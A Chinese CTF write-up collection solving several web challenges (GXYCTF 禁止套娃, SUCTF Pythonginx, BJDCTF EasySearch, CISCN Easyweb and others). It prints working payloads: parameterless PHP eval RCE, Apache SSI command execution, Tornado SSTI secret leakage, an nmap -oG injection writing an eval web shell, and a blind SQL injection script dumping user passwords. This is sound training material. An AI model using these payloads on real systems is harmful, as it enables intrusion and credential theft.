<h4 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="*[强网杯 2019]高明的黑客"></a>*[强网杯 2019]高明的黑客</h4><p>下载文件后发现有很多php文件，本题目考查的是编写<code>脚本</code>的能力，找出存在可用shell的php文件。</p>
<p>参考链接：[(40条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115256974">强网杯 2019]高明的黑客_Sk1y的博客-CSDN博客</a></p>
<hr>
<h4 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="*[GXYCTF2019]禁止套娃"></a>*[GXYCTF2019]禁止套娃</h4><p>git泄露，githack扫到index.php文件</p>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// echo $_GET['exp'];</span>
                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// highlight_file(__FILE__);</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第二个if语句表示我们不能传参伪协议，第三个if语句的正则匹配涉及<code>递归模式</code>和<code>无参数函数的校验</code>，参考链接：<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE · sky’s blog (skysec.top)</a></p>
<p>简单点来说，就可以这样理解：</p>
<p><code>&#39;/[a-z,_]+\(\)/&#39;</code><br>把<code>(?R)</code>挖掉得到这个正则，这个正则可以匹配类似这样的字符串：<code>phpinfo()</code><br>但是括号里面有一个递归模式，可以理解成可以递归：</p>
<p><code>phpinfo(phpinfo(phpinfo()))</code><br>无穷的递归下去，也就是说我们要传的是函数名，但是里面不能有参数。因此这题的考点也就是<code>无参数RCE</code></p>
<p>方法一：</p>
<p>?exp&#x3D;readfile(session_id(session_start()));</p>
<p>PHPSESSID&#x3D;flag.php</p>
<p>方法二：</p>
<p>?exp&#x3D;highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</p>
<p>然后不断发送</p>
<hr>
<h4 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h4><p>Nginx重要配置文件</p>
<pre class="line-numbers language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx
主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf
管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service
模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules
应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx
程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html
日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx
配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>℆</code>这个字符,如果使用python3进行idna编码的话<br>print(‘℆’.encode(‘idna’))<br>结果<br>b’c&#x2F;u’<br>如果再使用utf-8进行解码的话<br>print(b’c&#x2F;u’.decode(‘utf-8’))<br>结果<br>c&#x2F;u<br>通过这种方法可以绕过本题，还可以使用<code>ℂ</code>字符绕过c</p>
<pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;suctf.c℆sr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;suctf.c℆sr&#x2F;fffffflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>利用urlunsplit解题</strong></p>
<p> 假如我们传入：<code>file:////www.example.com</code>,进行了 <code>list(urlsplit(url))</code> 函数以后就变成了<code>[&#39;file&#39;, &#39;&#39;, &#39;//www.example.com&#39;, &#39;&#39;, &#39;&#39;]</code>。也就是它解析域名块为空了。<br>但当再执行 urlunsplit 时 就会合成为 <code>file://www.example.com</code> 这样就达到了绕过的效果了，还是非常奈斯的！！</p>
<hr>
<h4 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h4><p>&#x3D;&#x3D;Apache SSI远程命令执行漏洞&#x3D;&#x3D;	参考链接：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1540513">Apache SSI 远程命令执行漏洞复现 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p>首先是源码泄露，访问index.php.swp，显示源码，存在md5验证，拿脚本跑就ok</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>
  <span class="token keyword">if</span> h <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到password&#x3D;2020666</p>
<p>在抓的包中有一个url，以shtml结尾，想到ssi远程命令执行漏洞，可以上传一个shtml文件，但这里没有文件上传的入口，想到可以利用username传参，</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;cd ..&#x2F;;cat flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password&#x3D;2020666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后访问响应报文给的url，拿到flag</p>
<hr>
<h4 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h4><p>涉及render函数、ssti注入、Tornado(python的web框架)</p>
<p>三个txt文件，知道了flag文件是<code>/fllllllllllllag</code></p>
<p>在hint.txt文件中也知道了加密格式<code>md5(cookie_secret+md5(filename))</code></p>
<p>重要的是找到<code>cookie_secret</code>，</p>
<p>那么 cookie_secret 又是什么东西呢，在 Tornado 中，通过在 tornado.web.Application 中添加 cookie_secret 参数，我们就可以使用 set_secure_cookie() 和 get_secure_cookie() 函数来发送和取得浏览器的 cookies ，借助该参数可以对 cookie 进行简易加密以防止 Cookie 被恶意篡改。关于 Tornado 的 cookie_secret 值 可以参考博客<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhanghongfeng/p/8182909.html">tornado安全应用之cookie - 一张红枫叶 - 博客园 (cnblogs.com)</a>或者<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liyqiang/p/7140530.html">tornado中的cookie - TianTianLi - 博客园 (cnblogs.com)</a></p>
<p>简单总结一下就是，cookie_secret 是存在于 settings 中的，settings 又作为参数传入了 Application 构造函数，因此可以通过 self.application.settings 来获取到 cookie_secret。又因为根据官方文档， RequestHandler.settings 的别名是 self.application.settings，且 handler 指向处理当前这个页面的 RequestHandler 对象，故最终的效果就是可以直接通过 handler.settings 来得到 cookie_secret 的值。</p>
<p>在一个error页面存在ssti注入，传参<code>msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>拿到<code>cookie_secret</code></p>
<p>脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#导入hashlib模块</span>
<span class="token keyword">import</span> hashlib

<span class="token comment">#获取一个md5加密算法对象</span>
md <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#用提供的 字节串 更新此哈希对象(hash object)的状态。</span>
md<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">'/fllllllllllllag'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#NOTICE：</span>
<span class="token comment">#update()方法需要接收的参数是一个字节对象。</span>
<span class="token comment">#向对象中传入字节串时，必须为编码类型。可以使用字符串前b' '的方法或使用.encode('UTF-8')的方法，使字符串变为bytes类型</span>

<span class="token comment">#以十六进制数字字符串的形式返回摘要值（哈希函数计算后生成的值就叫做摘要或者摘要值）</span>
fact <span class="token operator">=</span> md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

md <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
md<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'8a666cd6-6ece-4793-9236-dd7c75a5ff97'</span> <span class="token operator">+</span> fact<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最终payload：<code>?filename=/fllllllllllllag&amp;filehash=1c96931b251b0ee71fd6751fb4d68db9</code></p>
<h4 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="*[HCTF 2018]admin"></a>*[HCTF 2018]admin</h4><p>有三种方法：</p>
<ol>
<li><p>flask session伪造</p>
<p>注册账号，然后在改密码的页面源码发现 <a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a> ，在github上可以找到源码。flask是轻量级web框架，session存在客户端，我们可以伪造session(cookie)。<br>第一步，想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的<code>SECRET_KEY</code>，在config.py里。<br>第二步，找到flask session加密脚本，然后随便找一个自己的cookie，解密后吧name的值改为admin再进行加密。（&#x3D;&#x3D;这里脚本不会使用&#x3D;&#x3D;）<br>最后，将session输回去，返回index得flag。</p>
</li>
<li><p>unicode欺骗</p>
<p>首先注册账号：ᴬᴰᴹᴵᴺ，密码：123<br>然后更改密码<br>最后以admin登录大致的思路是：<br>在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转    成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ , 当我们再次退出登录的时候 ”admin“经过strlower()变成”admin“(没啥卵用，但是你已经知道了一个密码已知的”admin“，而且在index.html中可以看到只要session[‘name’]&#x3D;&#x3D;’admin’,也就是只要用户名是’admin‘就可成功登录了)</p>
</li>
<li><p>条件竞争</p>
<p>仔细观察源码，可以发现login函数和change函数都在没有完全check身份的情况下，执行了session有关的赋值。<br>我们可以这样设想，一个进程以正常账号一直依次进行登录、改密码操作，另一个进程同时一直依次进行注销、以admin用户名加进程1更改的新密码进行登录。就有可能出现当进程1进行到改密码函数时，进程2进行到登录操作，这个时候进程1需要从session中取出name，而进程2此时把session[‘name’]改成了admin。<br>所以就可以编写脚本进行条件竞争，条件竞争结束的标志为进程2登录操作成功，即重定向到&#x2F;index（&#x3D;&#x3D;这里脚本不会写&#x3D;&#x3D;）</p>
</li>
</ol>
<hr>
<h4 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="*[BUUCTF 2018]Online Tool"></a>*[BUUCTF 2018]Online Tool</h4><p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com)</a></p>
<p>remote_addr和x_forwarded_for这两个是见的比较多的，服务器获取ip用的，这里没什么用</p>
<p>发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
<p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了…</p>
<p>我们来构造payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">?host=' <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"hack"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> -oG hack.php '<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行后会返回文件夹名，然后用蚁剑连接，拿到flag</p>
<hr>
<h4 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h4><p>发现robots.txt文件有提示，<code>*.php.bak</code>，说明有备份文件泄露，在f12的网络里发现了image.php，尝试下载image.php.bak，成功了。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select * from images where id='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>' or path='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$path</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"./"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现sql语句，可以传递id和path两个参数，触发SQL注入，前提是要绕过对id和path的过滤。接下来想办法绕过过滤，主要是破坏单引号</p>
<p>只能是用转义字符<code>\</code>或者单引号自己来破坏。但是用单引号一定会被替换掉，只能考虑<code>\</code></p>
<p>如果参数中有<code>\</code>或者<code>&#39;</code>会被在加上一个<code>\</code>来转义。因此如果令id为<code>\0</code>，id会先变成<code>\\0</code>。之后<code>\0</code>被替换掉，会剩下一个<code>\</code></p>
<p>脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>url_format<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rlt <span class="token operator">=</span> <span class="token string">''</span>
    url  <span class="token operator">=</span> url_format
    <span class="token keyword">if</span> length<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> <span class="token number">30</span>
    <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#从可打印字符开始</span>
        begin <span class="token operator">=</span> <span class="token number">32</span>
        ends <span class="token operator">=</span> <span class="token number">126</span>
        tmp <span class="token operator">=</span> <span class="token punctuation">(</span>begin<span class="token operator">+</span>ends<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">while</span> begin<span class="token operator">&lt;</span>ends<span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> r<span class="token punctuation">.</span>content<span class="token operator">!=</span><span class="token string">b''</span><span class="token punctuation">:</span>
                begin <span class="token operator">=</span> tmp<span class="token operator">+</span><span class="token number">1</span>
                tmp <span class="token operator">=</span> <span class="token punctuation">(</span>begin<span class="token operator">+</span>ends<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                ends <span class="token operator">=</span> tmp
                tmp <span class="token operator">=</span> <span class="token punctuation">(</span>begin<span class="token operator">+</span>ends<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token comment">#酌情删除，毕竟一般库表列里都没有空格</span>
        <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        rlt<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>rlt<span class="token punctuation">)</span>
    <span class="token keyword">return</span> rlt<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr(database(),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据库名为：'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x636973636e66696e616c),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'表名为：'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=0x636973636e66696e616c and table_name=0x7573657273),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'列名为：'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(username)%20from%20users),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户名为：'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
url <span class="token operator">=</span><span class="token string">'http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(password)%20from%20users),&#123;&#125;,1))>&#123;&#125;%23'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'密码为：'</span><span class="token punctuation">,</span>exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#url要填入自己的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跑完后有账号密码，登录后有一个文件上传</p>
<p>会将我们上传的文件名写入log文件，想到可以写木马进去，但是php被过滤，用&#x3D;代替</p>
<p><code>&lt;?= @eval($_POST[&#39;cmd&#39;]);?&gt;</code>		要在抓包的时候改名字</p>
<p>然后访问文件，连接蚁剑。</p>
<hr>
<h4 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h4><p>这题主要有两个知识点<br>1.php短标签<br>2.php可在&#96;&#96;中执行系统命令</p>
<p><code>&lt;?= ?&gt;</code>相当于<code>&lt;?echo ?&gt;</code>,空格杯过滤了用%09代替</p>
<p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符”&#96;”的效果与函数shell_exec() 相同。</p>
<p>paylaod:</p>
<pre class="line-numbers language-none"><code class="language-none">?data&#x3D;&lt;?echo%09&#96;cat%09&#x2F;flllllll1112222222lag&#96;?&gt;&amp;action&#x3D;upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h4 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h4><p>直接给了源代码，有一个<code>get_the_flag</code>函数和get传参<code>_</code> ，最后会执行<code>eval(_)</code></p>
<p>思路：get传参利用get_the_flag函数上传木马文件</p>
<p>&#x3D;&#x3D;无数字字母getshell&#x3D;&#x3D;</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>必须要绕过这个正则匹配</p>
<p>payload:</p>
